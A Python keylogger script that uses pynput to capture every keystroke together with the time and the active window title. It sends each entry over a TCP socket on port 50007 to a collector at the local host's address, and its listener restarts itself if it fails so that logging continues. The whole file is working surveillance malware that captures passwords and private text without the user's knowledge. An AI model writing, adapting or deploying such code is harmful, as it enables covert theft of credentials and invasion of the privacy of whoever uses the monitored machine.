# Importing libs
from pynput import keyboard
from datetime import datetime
from pyautogui import getActiveWindowTitle
from socket import socket, gethostbyname, gethostname, AF_INET, SOCK_STREAM
from sys import setrecursionlimit

log = ''

# Function that send the current log to the working service
def send():
    global log
    server = socket(AF_INET, SOCK_STREAM)
    server.connect((gethostbyname(gethostname()), 50007))
    log = log.encode('utf-8')
    server.send(log)
    log = ''

# Function to put the date, the name of the active window and the key in the log
def add_log(skey):
    global log
    current_time = datetime.now()
    current_time_hour = str(current_time.hour)
    current_time_minute = str(current_time.minute)
    current_time_second = str(current_time.second)
    try:
        window_name = getActiveWindowTitle()
    except AttributeError:
        window_name = "Not found"

    log += "\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey
    send()

# Function that transform what the user types and send it to add_log function
def press(key):
    try:
        if key == keyboard.Key.esc:
            add_log("<esc>")
        elif key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            add_log("<win>")
        elif key == keyboard.Key.delete:
            add_log("<delete>")
        elif key == keyboard.Key.space:
            add_log("<space>")
        elif key == keyboard.Key.backspace:
            add_log("<backspace>")
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            add_log("<shift>")
        elif key == keyboard.Key.enter:
            add_log("<enter>")
        elif key == keyboard.Key.tab:
            add_log("<tab>")
        elif key == keyboard.Key.alt_gr or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key:
            add_log("<alt>")
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl:
            add_log("<ctrl>")
        elif key == keyboard.Key.caps_lock:
            add_log("<caps_lock>")
        elif key == keyboard.Key.left:
            add_log("<left_arrow>")
        elif key == keyboard.Key.right:
            add_log("<right_arrow>")
        else:
            ekey = (f"" + "<{0}>".format(key.char))
            add_log(ekey)
    except AttributeError:
        add_log("Key not Found")

# Start the listener. If it stops working while listening, will be restarted
setrecursionlimit(10000)

def start():
    try:
        with keyboard.Listener(on_press=press) as listener:
            listener.join()
    except Exception:
        start()

start()